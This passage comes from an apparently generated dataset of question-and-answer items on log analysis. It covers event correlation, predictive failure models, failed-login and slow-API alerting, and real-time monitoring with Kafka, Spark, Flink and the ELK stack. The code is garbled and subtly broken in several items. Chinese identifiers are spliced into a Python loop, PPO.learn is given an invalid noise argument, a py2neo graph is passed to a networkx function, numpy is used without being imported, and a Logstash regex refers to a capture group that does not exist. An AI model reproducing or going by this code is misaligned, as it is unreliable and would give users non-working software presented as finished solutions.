mode='human'):\n        pass\n\n# Load and preprocess log data\nlogs = pd.read_csv('log_data.csv', parse_dates=['timestamp'])\nlogs['timestamp'] = logs['timestamp'].dt.floor('1T')\nlog_data = logs['value'].values\n\n# Initialize environment\nthreshold_bounds = (0, 100)\nenv = LogMonitoringEnv(log_data, threshold_bounds)\n\n# Define action space noise\naction_noise = NormalActionNoise(mean=np.zeros(1), sigma=0.1 * np.ones(1))\n\n# Train reinforcement learning model\nmodel = PPO('MlpPolicy', env, verbose=1)\nmodel.learn(total_timesteps=10000, callback=None, action_noise=action_noise)\n\n# Test the trained model\nobs = env.reset()\nwhile not env.done:\n    action, _states = model.predict(obs, deterministic=True)\n    obs, reward, done, info = env.step(action)\n    print(f\"Threshold: {action[0]}, Reward: {reward}\")\n\n# Save the trained model for production use\nmodel.save(\"log_monitoring_model\")\n```\n\nThese examples demonstrate the use of natural language processing for extracting information from raw logs and time-series analysis for anomaly detection (Question 1). For Question 2, the example uses reinforcement learning to learn an optimal policy for adjusting log monitoring thresholds."}, {"L2_TASK": "Log Analysis (Text -> Text)", "L3_TASK": "Log event correlation", "Complexity_Level": "medium", "Response": "\"Log Analysis (Text -> Text)\" is not directly mentioned in the provided JSON, but it falls under the broader category of \"Data Science\" or \"Software Development\" when dealing with log processing and analysis. Here, we'll consider it as a part of \"Software Development\" focusing on data processing and pattern detection.\n\nQuestion 1:\nProblem: Develop a script to correlate log events from a server by grouping similar errors occurring within a time window.\n\nSolution:\nWe can use Python with its `pandas` library for data manipulation and `datetime` for handling time-related operations.\n\n```python\nimport pandas as pd\nfrom datetime import timedelta\n\n# Assume we have a log file with the following structure:\n# timestamp,level,message\nlog_data = [\n    ['2023-03-01 13:00:01', 'ERROR', 'Error 1'],\n    ['2023-03-01 13:00:05', 'ERROR', 'Error 2'],\n    ['2023-03-01 13:00:10', 'WARN', 'Warning 1'],\n    ['2023-03-01 13:00:20', 'ERROR', 'Error 1'],\n    ['2023-03-01 13:01:00', 'ERROR', 'Error 3'],\n    ['2023-03-01 13:01:05', 'ERROR', 'Error 1']\n]\n\n# Convert the log data into a DataFrame\ndf = pd.DataFrame(log_data, columns=['timestamp', 'level', 'message'])\n\n# Convert timestamp column to datetime\ndf['timestamp'] = pd.to_datetime(df['timestamp'])\n\n# Define the time window (e.g., 1 minute)\ntime_window = timedelta(minutes=1)\n\n# Group by errors within the time window\ngrouped_errors = df[df['level'] == 'ERROR'].groupby(\n    (df['timestamp'] - df['timestamp'].shift()).dt.total_seconds().gt(time_window).cumsum())\n\n# Print correlated errors\nfor group, data in grouped_errors:\n    print(f\"Correlated Error Group {group}:\")\n    print(data)\n```\n\nConcept: \"Data Processing\" and \"Pattern Detection\"\n\nQuestion 2:\nProblem: Create a script to identify and count the frequency of unique error messages that occur multiple times within a specific time duration.\n\nSolution:\nWe can use Python with `pandas` again to achieve this.\n\n```python\nimport pandas as pd\nfrom datetime import timedelta\n\n# Same log_data as before\n\n# Convert the log data into a DataFrame\ndf = pd.DataFrame(log_data, columns=['timestamp', 'level', 'message'])\n\n# Convert timestamp column to datetime\ndf['timestamp'] = pd.to_datetime(df['timestamp'])\n\n# Define the time duration (e.g., 5 minutes)\ntime_duration = timedelta(minutes=5)\n\n# Filter error messages within the time duration\ndf_filtered = df[df['level'] == 'ERROR'][df['timestamp'] > df['timestamp'].min() - time_duration]\n\n# Count unique errors with multiple occurrences\nunique_errors = df_filtered.groupby('message').filter(lambda x: len(x) > 1).groupby('message').size().reset_index(name='count')\n\n# Print the results\nprint(\"Error Messages with multiple occurrences within the last 5 minutes:\")\nprint(unique_errors)\n```\n\nConcept: \"Data Filtering\" and \"Frequency Analysis\""}, {"L2_TASK": "Log Analysis (Text -> Text)", "L3_TASK": "Log event correlation", "Complexity_Level": "extremely difficult", "Response": "\"Log Analysis (Text -> Text)\" is not explicitly mentioned in the provided JSON, but it falls under the broader scope of \"Data Science\" and \"Machine Learning\" concepts, where log data can be analyzed and processed using various techniques. Here, I will assume the problem involves analyzing log files from multiple sources, extracting meaningful information, and correlating events across these logs for anomaly detection or troubleshooting purposes.\n\nQuestion 1: Develop an advanced log event correlation system that identifies complex patterns and anomalies in distributed system logs. The system must be able to handle large log files, perform real-time analysis, and generate alerts for critical events.\n\nSolution Concept: \"Log Event Analysis using NLP and Graph Databases\"\n\n```python\n# Import necessary libraries\nimport pandas as pd\nimport numpy as np\nimport re\nimport nltk\nfrom nltk.corpus import stopwords\nfrom nltk.stem import WordNetLemmatizer\nfrom sklearn.feature_extraction.text import TfidfVectorizer\nfrom sklearn.metrics.pairwise import cosine_similarity\nfrom networkx.algorithms.community import greedy_modularity_communities\nimport py2neo\n\n# Load and preprocess log data\ndef preprocess_logs(log_data):\n    # Tokenization, stopword removal, lemmatization\n    # ...\n\n# Extract features using TF-IDF\ndef extract_features(logs):\n    vectorizer = TfidfVectorizer()\n    tfidf_matrix = vectorizer.fit_transform(logs)\n    return tfidf_matrix\n\n# Compute cosine similarity matrix\ndef compute_similarity_matrix(tfidf_matrix):\n    csim = cosine_similarity(tfidf_matrix)\n    return csim\n\n# Identify correlated log events using community detection\ndef find_correlated_events(csim_matrix, logs):\n    graph = create_graph_from_similarity(csim_matrix)\n    communities = greedy_modularity_communities(graph)\n    correlated_events = []\n    for community in communities:\n        correlated_events.append(logs[community])\n    return correlated_events\n\n# Create a graph from similarity matrix\ndef create_graph_from_similarity(csim_matrix):\n    G = py2neo.Graph()\n    # Create nodes and edges based on similarity scores\n    # ...\n\n# Real-time monitoring and alert generation\ndef monitor_logs():\n    while True:\n        new_log = fetch_new_log()  # Fetch new log data\n        preprocessed_log = preprocess_logs([new_log])\n       \u76f8\u4f3c\u6027\u77e9\u9635 = \u8ba1\u7b97\u76f8\u4f3c\u6027\u77e9\u9635(extract_features(preprocessed_log))\n        correlated_events = find_correlated_events(\u76f8\u4f3c\u6027\u77e9\u9635, preprocessed_logs)\n        for event in correlated_events:\n            if is_critical(event):  # Define your own criticality criteria\n                send_alert(event)\n        time.sleep(60)  # Check for new logs every minute\n\n# Initialize the monitoring system\nmonitor_logs()\n```\n\nQuestion 2: Create a log event correlation engine that uses unsupervised learning to detect previously unknown security threats in log data. The system should be able to cluster similar log events and flag potential attacks based on deviations from normal patterns.\n\nSolution Concept: \"Unsupervised Learning with Clustering and Anomaly Detection\"\n\n```python\n# Import necessary libraries\nimport pandas as pd\nimport numpy as np\nfrom sklearn.preprocessing import StandardScaler\nfrom sklearn.cluster import DBSCAN\nfrom sklearn.ensemble import IsolationForest\nimport py2neo\n\n# Load and preprocess log data\ndef preprocess_logs(log_data):\n    # Tokenization, numerical encoding, normalization\n    # ...\n\n# Perform DBSCAN clustering on preprocessed logs\ndef cluster_logs(preprocessed_logs):\n    scaler = StandardScaler()\n    scaled_data = scaler.fit_transform(preprocessed_logs)\n    db = DBSCAN(eps=0.3, min_samples=10).fit(scaled_data)\n    return db.labels_\n\n# Identify anomalies using Isolation Forest\ndef detect_anomalies(preprocessed_logs):\n    clf = IsolationForest(contamination='auto')\n    clf.fit(preprocessed_logs)\n    anomalies = clf.predict(preprocessed_logs)\n    return anomalies\n\n# Flag potential security threats\ndef flag_security_threats(labels, anomalies):\n    threats = np.intersect1d(np.where(labels != -1)[0], np.where(anomalies == -1)[0])\n    return threats\n\n# Real-time monitoring and alert generation\ndef monitor_logs():\n    while True:\n        new_log_data = fetch_new_log_data()  # Fetch new log data\n        preprocessed_new_data = preprocess_logs(new_log_data)\n        all_logs = np.concatenate((preprocessed_logs, preprocessed_new_data), axis=0)\n        labels = cluster_logs(all_logs)\n        anomalies = detect_anomalies(all_logs)\n        threats = flag_security_threats(labels, anomalies)\n        for threat in threats:\n            send_alert(all_logs[threat])  # Send alert for each flagged event\n        preprocessed_logs = all_logs  # Update the preprocessed logs\n        time.sleep(60)  # Check for new logs every minute\n\n# Initialize the monitoring system\nmonitor_logs()\n```\nNote: These solutions involve multiple steps and require additional implementation details, such as fetching new log data, preprocessing, and sending alerts, which are not provided here. They are also highly dependent on the specific format and content of the log data."}, {"L2_TASK": "Log Analysis (Text -> Text)", "L3_TASK": "Predictive log analysis", "Complexity_Level": "medium", "Response": "{\"Concept\": \"Log Analysis (Text -> Text)\"}\n\nQuestion 1:\nProblem: You are working on a web application that generates logs containing information about user actions and errors. You need to create a predictive model to anticipate potential issues based on the log patterns. Your medium complexity task is to design a log parser that extracts relevant features from logs and trains a machine learning model to predict server crashes.\n\nSolution:\n```python\nimport re\nimport pandas as pd\nfrom sklearn.feature_extraction.text import TfidfVectorizer\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.naive_bayes import MultinomialNB\nfrom sklearn.metrics import accuracy_score\n\n# Example log data\nlogs = [\n    \"User 1234 logged in successfully\",\n    \"Error: Server ran out of memory\",\n    \"User 5678 requested resource /image.jpg\",\n    \"Error: Database connection failed\",\n    \"User 9012 performed a search\",\n    # ...\n]\n\n# Define a regex pattern to extract error messages\nerror_pattern = re.compile(r\"Error: (.*)\")\n\n# Function to extract features and labels\ndef process_logs(logs):\n    features = []\n    labels = []\n    for log in logs:\n        if error_pattern.search(log):\n            features.append(error_pattern.search(log).group(1))\n            labels.append(1)  # Label 1 represents an error\n        else:\n            features.append(log)\n            labels.append(0)  # Label 0 represents no error\n\n    return features, labels\n\n# Preprocess logs\nfeatures, labels = process_logs(logs)\n\n# Convert text data to numerical features\nvectorizer = TfidfVectorizer()\nX = vectorizer.fit_transform(features)\n\n# Split data into training and testing sets\nX_train, X_test, y_train, y_test = train_test_split(X, labels, test_size=0.2, random_state=42)\n\n# Train a Naive Bayes classifier\nclf = MultinomialNB()\nclf.fit(X_train, y_train)\n\n# Make predictions\ny_pred = clf.predict(X_test)\n\n# Evaluate model accuracy\naccuracy = accuracy_score(y_test, y_pred)\nprint(f\"Model accuracy: {accuracy}\")\n```\nQuestion 2:\nProblem: You are tasked with predicting hardware failures based on log data from a server. The logs contain messages related to temperature, disk usage, and memory usage. Create a log parser that extracts the relevant metrics and trains a linear regression model to predict when a hardware failure might occur.\n\nSolution:\n```python\nimport re\nimport pandas as pd\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.linear_model import LinearRegression\nfrom sklearn.metrics import mean_squared_error\n\n# Example log data\nlogs = [\n    \"Temperature: 65\u00b0C, Disk usage: 75%, Memory usage: 50%\",\n    \"Temperature: 75\u00b0C, Disk usage: 80%, Memory usage: 60%\",\n    \"Temperature: 80\u00b0C, Disk usage: 90%, Memory usage: 70%\",\n    \"Temperature: 85\u00b0C, Disk failure\",\n    \"Temperature: 60\u00b0C, Disk usage: 65%, Memory usage: 45%\",\n    # ...\n]\n\n# Define regex patterns to extract metrics\ntemp_pattern = re.compile(r\"Temperature: (\\d+)\u00b0C\")\ndisk_pattern = re.compile(r\"Disk usage: (\\d+)%\")\nmemory_pattern = re.compile(r\"Memory usage: (\\d+)%\")\n\n# Function to extract features and labels\ndef extract_metrics(logs):\n    features = []\n    labels = []\n    for log in logs:\n        temp = temp_pattern.search(log)\n        disk = disk_pattern.search(log)\n        memory = memory_pattern.search(log)\n\n        if temp and disk and memory:\n            features.append([float(temp.group(1)), int(disk.group(1)), int(memory.group(1))])\n        elif \"Disk failure\" in log:\n            labels.append(1)  # Label 1 represents a failure\n            features.append([np.nan, np.nan, np.nan])  # Add NaN for non-numeric log for failure\n        else:\n            labels.append(0)  # Label 0 represents no failure\n\n    return features, labels\n\n# Preprocess logs\nfeatures, labels = extract_metrics(logs)\n\n# Fill NaN values and convert data to numerical array\nfeatures = np.nan_to_num(features)\nX = np.array(features)\n\n# Split data into training and testing sets\nX_train, X_test, y_train, y_test = train_test_split(X, labels, test_size=0.2, random_state=42)\n\n# Train a Linear Regression model\nclf = LinearRegression()\nclf.fit(X_train, y_train)\n\n# Make predictions\ny_pred = clf.predict(X_test)\n\n# Evaluate model using mean squared error\nmse = mean_squared_error(y_test, y_pred)\nprint(f\"Mean Squared Error: {mse}\")\n```\nNote: These examples use simplified log data and patterns for demonstration purposes. In a real-world scenario, the log data and patterns would be more complex, and additional preprocessing steps might be needed."}, {"L2_TASK": "Log Analysis (Text -> Text)", "L3_TASK": "Predictive log analysis", "Complexity_Level": "extremely difficult", "Response": "Log analysis, particularly predictive log analysis, is a challenging task that involves extracting valuable insights and patterns from log data to anticipate future events or system behavior. It typically involves machine learning techniques and advanced data processing.\n\nQuestion 1:\nProblem: Develop a real-time, streaming log analysis system that predicts hardware failures in a data center based on log messages. The system should detect anomalies and classify them into specific hardware components, such as hard disks, network interfaces, or power supplies.\n\nConcept: Text Mining, Machine Learning, Stream Processing\n\n```python\nimport pandas as pd\nimport numpy as np\nfrom sklearn.feature_extraction.text import TfidfVectorizer\nfrom sklearn.svm import SVC\nfrom kafka import KafkaConsumer\nfrom nltk.corpus import stopwords\nfrom nltk.tokenize import word_tokenize\nimport re\n\n# Preprocessing function\ndef preprocess_log(log):\n    log = re.sub(r'\\W+', ' ', log.lower())  # Remove non-alphanumeric characters\n    tokens = word_tokenize(log)\n    tokens = [token for token in tokens if token not in stopwords.words('english')]\n    return ' '.join(tokens)\n\n# Load historical log data for training\ntrain_logs = pd.read_csv('train_logs.csv')\ntrain_logs['processed_log'] = train_logs['log'].apply(preprocess_log)\n\n# Train a classifier\nvectorizer = TfidfVectorizer()\nX_train = vectorizer.fit_transform(train_logs['processed_log'])\ny_train = train_logs['failure_type']\nclf = SVC(kernel='linear', probability=True)\nclf.fit(X_train, y_train)\n\n# Kafka consumer for real-time log streaming\nconsumer = KafkaConsumer('log_topic', bootstrap_servers=['localhost:9092'], auto_offset_reset='earliest')\n\n# Real-time log prediction\nfor message in consumer:\n    log = message.value.decode('utf-8')\n    processed_log = preprocess_log(log)\n    X_test = vectorizer.transform([processed_log])\n    predicted_failure = clf.predict(X_test)\n    predicted_prob = clf.predict_proba(X_test)[0]\n    \n    if predicted_prob.max() > 0.9:\n        print(f'Predicted failure: {predicted_failure[0]}, Probability: {predicted_prob.max():.2f}')\n```\n\nQuestion 2:\nProblem: Create a log analysis system that predicts security threats by identifying malicious patterns in application logs. The system should be able to detect both known and unknown threats using unsupervised learning and clustering techniques.\n\nConcept: Text Mining, Unsupervised Learning, Clustering\n\n```python\nimport pandas as pd\nimport numpy as np\nfrom sklearn.feature_extraction.text import TfidfVectorizer\nfrom sklearn.cluster import DBSCAN\nfrom kafka import KafkaConsumer\nfrom nltk.corpus import stopwords\nfrom nltk.tokenize import word_tokenize\nimport re\n\ndef preprocess_log(log):\n    # Same as previous example\n\n# Load historical log data for reference\nreference_logs = pd.read_csv('reference_logs.csv')\nreference_logs['processed_log'] = reference_logs['log'].apply(preprocess_log)\n\n# Vectorize logs\nvectorizer = TfidfVectorizer()\nX_ref = vectorizer.fit_transform(reference_logs['processed_log'])\n\n# DBSCAN clustering\ndb = DBSCAN(eps=0.3, min_samples=10).fit(X_ref)\nreference_logs['cluster'] = db.labels_\n\n# Kafka consumer for real-time log streaming\nconsumer = KafkaConsumer('log_topic', bootstrap_servers=['localhost:9092'], auto_offset_reset='earliest')\n\n# Real-time log anomaly detection\nfor message in consumer:\n    log = message.value.decode('utf-8')\n    processed_log = preprocess_log(log)\n    X_test = vectorizer.transform([processed_log])\n    \n    # Distance to nearest cluster center\n    distances = np.sqrt(np.sum((X_test - X_ref)**2, axis=1))\n    nearest_cluster = distances.argmin()\n    distance_to_cluster = distances[0][nearest_cluster]\n    \n    if distance_to_cluster > np.percentile(reference_logs['distance_to_cluster'], 95):\n        print(f'Potential anomaly detected: Distance: {distance_to_cluster:.2f}')\n```\n\nNote: These examples assume that there is a Kafka server running locally with logs being streamed to a topic named 'log_topic'. The 'train_logs.csv' and 'reference_logs.csv' files should be preprocessed and labeled datasets for training and reference purposes, respectively."}, {"L2_TASK": "Log Analysis (Text -> Text)", "L3_TASK": "Log-based alerting", "Complexity_Level": "medium", "Response": "Domain: Log Analysis (Text -> Text), Sub Area: Log-based alerting\nProblem 1: Implement a log analyzer that identifies a high number of failed login attempts within a specific time frame and sends an email alert.\n\nConcept: Text processing, Conditional statements, Time intervals, Email sending\n\n```python\nimport re\nimport time\nfrom datetime import datetime, timedelta\nimport smtplib\nfrom email.mime.text import MIMEText\n\n# Define log line pattern\nLOG_PATTERN = r'^\\[(?P<timestamp>\\d{4}-\\d{2}-\\d{2} \\d{2}:\\d{2}:\\d{2})\\] \\[(?P<level>\\w+)\\] \\[(?P<event>\\w+)\\] (?P<details>.*)$'\n\n# Set threshold for failed login attempts\nFAILED_LOGIN_THRESHOLD = 5\nALERT_EMAIL_INTERVAL = timedelta(minutes=15)\nALERT_EMAIL_ADDR = 'admin@example.com'\n\ndef parse_log_line(line):\n    match = re.match(LOG_PATTERN, line)\n    if match:\n        return match.groupdict()\n    return None\n\ndef is_failed_login(log_entry):\n    return log_entry['event'] == 'FAILED_LOGIN'\n\ndef process_log(file_path):\n    failed_attempts = 0\n    last_alert_time = datetime.now() - ALERT_EMAIL_INTERVAL\n\n    with open(file_path, 'r') as log_file:\n        for line in log_file:\n            log_entry = parse_log_line(line)\n            if log_entry and is_failed_login(log_entry):\n                failed_attempts += 1\n                current_time = datetime.strptime(log_entry['timestamp'], '%Y-%m-%d %H:%M:%S')\n                \n                if current_time > last_alert_time and failed_attempts >= FAILED_LOGIN_THRESHOLD:\n                    send_alert_email()\n                    last_alert_time = current_time\n                    failed_attempts = 0\n\ndef send_alert_email():\n    message = MIMEText('High number of failed login attempts detected!')\n    message['Subject'] = 'Alert: Excessive Failed Login Attempts'\n    message['From'] = 'log_monitor@example.com'\n    message['To'] = ALERT_EMAIL_ADDR\n\n    with smtplib.SMTP('smtp.example.com', 587) as smtp:\n        smtp.starttls()\n        smtp.login('your_email@example.com', 'your_password')\n        smtp.sendmail('your_email@example.com', ALERT_EMAIL_ADDR, message.as_string())\n\n# Example usage\nprocess_log('security.log')\n```\n\nProblem 2: Create a log analyzer that detects slow API response times and sends a notification to a Slack webhook.\n\nConcept: Text processing, Time intervals, API requests, JSON parsing\n\n```python\nimport re\nimport time\nimport json\nimport requests\nfrom datetime import datetime, timedelta\n\nLOG_PATTERN = r'^\\[(?P<timestamp>\\d{4}-\\d{2}-\\d{2} \\d{2}:\\d{2}:\\d{2})\\] \\[(?P<level>\\w+)\\] \\[(?P<event>\\w+)\\] \\[(?P<api_name>\\w+)\\] \\[(?P<response_time>\\d+)\\]ms$'\nSLOW_API_THRESHOLD = 500\nALERT_SLACK_INTERVAL = timedelta(minutes=15)\n\ndef parse_log_line(line):\n    match = re.match(LOG_PATTERN, line)\n    if match:\n        return match.groupdict()\n    return None\n\ndef is_slow_api(log_entry):\n    return log_entry['event'] == 'API_RESPONSE' and int(log_entry['response_time']) > SLOW_API_THRESHOLD\n\ndef process_log(file_path, slack_webhook_url):\n    last_alert_time = datetime.now() - ALERT_SLACK_INTERVAL\n\n    with open(file_path, 'r') as log_file:\n        for line in log_file:\n            log_entry = parse_log_line(line)\n            if log_entry and is_slow_api(log_entry):\n                current_time = datetime.strptime(log_entry['timestamp'], '%Y-%m-%d %H:%M:%S')\n                \n                if current_time > last_alert_time:\n                    send_slack_alert(log_entry)\n                    last_alert_time = current_time\n\ndef send_slack_alert(log_entry):\n    data = {\n        'text': f'Slow API Response: {log_entry[\"api_name\"]} ({log_entry[\"response_time\"]}ms)',\n        'channel': '#system-alerts',\n        'username': 'Log Monitor',\n        'icon_emoji': ':alert:'\n    }\n    requests.post(slack_webhook_url, json=data)\n\n# Example usage\nslack_webhook_url = 'https://hooks.slack.com/services/your/webhook/url'\nprocess_log('api.log', slack_webhook_url)\n```\n\nIn both solutions, log files are read line by line, and log entries are parsed to extract relevant information. If the conditions for high failed login attempts or slow API response times are met, an alert is sent to the respective notification channel (email or Slack). Time intervals are used to prevent frequent alerts."}, {"L2_TASK": "Log Analysis (Text -> Text)", "L3_TASK": "Log-based alerting", "Complexity_Level": "extremely difficult", "Response": "Area: \"Log Analysis (Text -> Text)\" Sub Area: \"Log-based alerting\"\nProblem: Develop a comprehensive log analysis system that can detect complex, multi-step security breaches by correlating events across different log sources in near real-time. The system should be able to create intelligent alerts and provide detailed forensic information for further investigation.\n\nSolution: We'll use Python with the Elasticsearch and Logstash for log storage and analysis, and Kibana for visualization. Also, we'll utilize the ELK (Elasticsearch, Logstash, Kibana) stack for efficient log management.\n\n1. Question: Create a Python script that uses Elasticsearch to analyze logs and trigger alerts when a specific sequence of events indicative of a potential SQL injection attack is detected.\n\nExample Python code (using `elasticsearch` library):\n```python\nfrom elasticsearch import Elasticsearch\nfrom datetime import datetime, timedelta\n\n# Connect to Elasticsearch\nes = Elasticsearch([{'host': 'localhost', 'port': 9200}])\n\n# Define the sequence of events for SQL injection attack\nevent_sequence = [\n    {'event_type': 'SQL Query', 'contains': 'SELECT * FROM users WHERE username ='},\n    {'event_type': 'Error', 'contains': 'Invalid user'},\n    {'event_type': 'Login', 'contains': 'Failed'}\n]\n\n# Function to search for event sequence\ndef find_event_sequence(start_time, end_time):\n    queries = []\n    for event in event_sequence:\n        queries.append({\n            'bool': {\n                'must': [\n                    {'match': {'@timestamp': {'gte': start_time, 'lte': end_time}}},\n                    {'match': {'event_type': event['event_type']}},\n                    {'match_phrase': {'message': event['contains']}}\n                ]\n            }\n        })\n    return queries\n\n# Main function to run analysis\ndef run_analysis(window_size=timedelta(minutes=15)):\n    now = datetime.now()\n    start_time = now - window_size\n    end_time = now\n\n    queries = find_event_sequence(start_time, end_time)\n\n    for i in range(len(queries) - 1):\n        query = {\n            'bool': {\n                'filter': [\n                    {'bool': {'should': queries[:i + 1], 'minimum_should_match': 1}}\n                ],\n                'must': queries[i + 1]\n            }\n        }\n\n        results = es.search(index='logs', body={'query': query}, size=1)\n        hits = results['hits']['total']['value']\n        if hits > 0:\n            print(f\"Potential SQL injection attack detected between {start_time} and {end_time}\")\n\n# Run the analysis every minute\nwhile True:\n    run_analysis()\n    time.sleep(60)\n```\n1. Question: Develop a Logstash filter that normalizes and enriches log data from multiple sources to ensure uniformity in event correlation and improve alerting accuracy.\n\nExample Logstash configuration:\n```ruby\ninput {\n  tcp {\n    port => 5000\n    codec => \"json\"\n  }\n  udp {\n    port => 5001\n    codec => \"json_lines\"\n  }\n  file {\n    path => [\"/var/log/application.log\", \"/var/log/security/*.log\"]\n    codec => \"plain\"\n  }\n}\n\nfilter {\n  # Normalize event types and add timestamp if missing\n  if ![event_timestamp] {\n    mutate {\n      add_field => { \"[event_timestamp]\" => \"%{@timestamp}\" }\n    }\n  }\n\n  # Enrich data based on event type\n  if [event_type] == \"web_request\" {\n    mutate {\n      gsub => [\n        \"[request_params][query_string]\", /'[^']+'|\"[^\"]+\"/, '\"\\1\"'\n      ]\n    }\n    json {\n      source => \"[request_params][query_string]\"\n      target => \"[parsed_request]\"\n    }\n  }\n  else if [event_type] == \"database\" {\n    grok {\n      match => { \"message\" => \"%{TIMESTAMP_ISO8601:db_timestamp} %{DATA:db_username} %{IPORHOST:db_ip} %{GREEDYDATA:db_query}\" }\n    }\n    date {\n      match => [\"db_timestamp\", \"ISO8601\"]\n      target => \"[db_timestamp]\"\n    }\n  }\n}\n\noutput {\n  elasticsearch {\n    hosts => [\"localhost:9200\"]\n    index => \"logs\"\n  }\n  stdout {}\n}\n```\nConcept: Log-based Alerting, Log Analysis, Elasticsearch, Logstash, Python, SQL Injection, Event Correlation, Log Normalization, Enrichment"}, {"L2_TASK": "Log Analysis (Text -> Text)", "L3_TASK": "Real-time log monitoring", "Complexity_Level": "medium", "Response": "As \"Log Analysis (Text -> Text)\" and \"Real-time log monitoring\" are not explicitly mentioned in the provided JSON, I will infer the concepts from the \"Development\" category, specifically from \"Web Development\" and \"Backend Development\". For real-time log monitoring, one might employ a logging framework or a combination of tools for capturing, processing, and analyzing logs in a streaming manner.\n\nQuestion 1: Design a system that receives real-time logs from multiple server applications and filters them for specific error messages using a simple log analysis tool or a log processing pipeline.\n\nConcept: \"Backend Development\", \"Real-time Data Processing\", \"Data Streaming\"\n\nSolution:\nWe can use a combination of a message broker like Apache Kafka, a stream processing engine like Apache Flink, and a log storage solution like Elasticsearch. Here's an example using Python to implement a simple log filtering component in Flink.\n\n```python\nfrom pyflink.dataset import ExecutionEnvironment\nfrom pyflink.streaming import StreamExecutionEnvironment\nfrom pyflink.table import StreamTableEnvironment, DataTypes\nfrom pyflink.table.descriptors import Schema, Kafka, OldCsv, Json\n\ndef setup_log_filtering(error_message):\n    env = StreamExecutionEnvironment.get_execution_environment()\n    t_env = StreamTableEnvironment.create(env)\n\n    # Define Kafka source\n    t_env.connect(Kafka()\n                  .version(\"universal\")\n                  .topic(\"server_logs\")\n                  .start_from_latest()\n                  .property(\"bootstrap.servers\", \"localhost:9092\"))\n    .with_format(OldCsv()\n                  .field(\"timestamp\", DataTypes.TIMESTAMP(3))\n                  .field(\"level\", DataTypes.STRING())\n                  .field(\"message\", DataTypes.STRING()))\n    .with_schema(Schema()\n                  .field(\"timestamp\", DataTypes.TIMESTAMP(3))\n                  .field(\"level\", DataTypes.STRING())\n                  .field(\"message\", DataTypes.STRING()))\n    .register_table_source(\"logs\")\n\n    # Define filter for specific error messages\n    filtered_logs = t_env.from_path(\"logs\") \\\n        .where(\"level = 'ERROR' AND message LIKE '%{}%'\".format(error_message))\n\n    # Define Elasticsearch sink\n    t_env.connect(Json()\n                  .version(\"1.1\")\n                  .path(\"http://localhost:9200/logs_filtered\"))\n    .with_format(Json())\n    .with_schema(Schema()\n                  .field(\"timestamp\", DataTypes.TIMESTAMP(3))\n                  .field(\"level\", DataTypes.STRING())\n                  .field(\"message\", DataTypes.STRING()))\n    .register_table_sink(\"filtered_logs\")\n\n    # Start the pipeline\n    t_env.insert_into(\"filtered_logs\", filtered_logs)\n    env.execute(\"Real-time Error Log Filter\")\n\n# Example usage\nsetup_log_filtering(\"Internal Server Error\")\n```\nThis code sets up a Flink pipeline that reads logs from a Kafka topic, filters for error messages containing the string \"Internal Server Error\", and writes the filtered logs to an Elasticsearch index.\n\nQuestion 2: Implement a Python script that reads logs from a file in real-time and sends them to a remote server for further analysis, ensuring that log lines are not lost in case of network interruptions.\n\nConcept: \"File Handling\", \"Real-time Data Processing\", \"Error Handling\"\n\nSolution:\n```python\nimport socket\nimport time\nfrom queue import Queue\nfrom threading import Thread\n\ndef send_logs_to_server(log_queue, server_address):\n    while True:\n        try:\n            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n                s.connect(server_address)\n                while True:\n                    log_line = log_queue.get()\n                    s.sendall(log_line.encode('utf-8'))\n                    log_queue.task_done()\n        except ConnectionRefusedError:\n            print(\"Connection refused. Retrying in 5 seconds...\")\n            time.sleep(5)\n        except Exception as e:\n            print(f\"An error occurred: {e}. Retrying in 5 seconds...\")\n            time.sleep(5)\n\ndef read_logs_realtime(log_file):\n    log_queue = Queue()\n    server_address = ('remote_server_ip', 1234)  # Replace with your server's IP and port\n\n    sender_thread = Thread(target=send_logs_to_server, args=(log_queue, server_address))\n    sender_thread.start()\n\n    with open(log_file, 'r') as f:\n        for line in f:\n            log_queue.put(line)\n            time.sleep(0.01)  # Prevent reading too fast, let the sender catch up\n\n    log_queue.join()  # Wait for all logs to be sent\n\n# Example usage\nread_logs_realtime('server_logs.txt')\n```\nThis script reads a log file in real-time, line by line, and sends the logs to a remote server using a separate thread. The sender thread handles reconnection automatically in case of network interruptions. The `time.sleep(0.01)` is added to ensure the sender can keep up with the reading speed, preventing log loss."}, {"L2_TASK": "Log Analysis (Text -> Text)", "L3_TASK": "Real-time log monitoring", "Complexity_Level": "extremely difficult", "Response": "{\"Concept\" : \"Log Analysis\"}\nQuestion 1:\nDesign an efficient, real-time log monitoring system that can handle millions of log entries per second from multiple sources and perform complex aggregations, anomaly detection, and pattern recognition in near real-time. The system should also have the capability to scale horizontally and provide a user-friendly dashboard for visualization.\n\nSolution:\nTo solve this problem, we can use a combination of Apache Kafka, Apache Spark, and a visualization tool like Grafana. Here's a high-level overview of the architecture:\n\n1. Ingestion: Implement a Kafka producer to collect log data from different sources and stream it into a Kafka topic.\n2. Processing: Set up a Spark Streaming job to consume log data from Kafka, perform transformations, and detect anomalies.\n3. Storage: Store processed data in a distributed storage system like HDFS or a time-series database like InfluxDB for querying.\n4. Aggregation and Analysis: Use Spark's windowing functions and grouping operations to perform complex aggregations and pattern recognition.\n5. Anomaly Detection: Employ machine learning algorithms (e.g., Isolation Forest or\u76d1\u63a7\u63a2\u9488) in Spark to identify anomalies in the log data.\n6. Visualization: Integrate with Grafana for real-time dashboarding of processed data.\n\nExample code (Spark Scala):\n\n```scala\nimport org.apache.spark.streaming.kafka010._\nimport org.apache.kafka.clients.consumer.ConsumerRecord\nimport org.apache.spark.streaming.{Seconds, StreamingContext}\nimport org.apache.spark.sql.functions._\n\n// Set up Spark Streaming context\nval ssc = new StreamingContext(sparkConf, Seconds(1))\nval kafkaParams = Map[String, Object]...\nval topics = Set(\"logs\")\n\n// Create Kafka Direct Stream\nval stream = KafkaUtils.createDirectStream[ConsumerRecord[String, String]](\n  ssc, kafkaParams, topics.map(_ -> DefaultDecoder.classTag))\n\n// Parse log data into structured logs\nstream\n  .map(_.value())\n  .map(logString => parseLog(logString)) // Custom function to parse logs\n  .foreachRDD(rdd => {\n    // Perform aggregations and anomaly detection\n    val aggregatedData = rdd.groupBy(_.category)\n      .mapValues(_.count())\n      .withColumn(\"anomaly_score\", anomalyScoreUDF($\"value\")) // Custom UDF for anomaly score\n\n    // Write aggregated data to InfluxDB\n    aggregatedData.write.format(\"influxdb\").options(options).save()\n  })\n\nssc.start()\nssc.awaitTermination()\n```\nQuestion 2:\nImplement a fault-tolerant, real-time log monitoring system that can handle log data with inconsistent formats, automatically identify the format, and route it to the correct processing 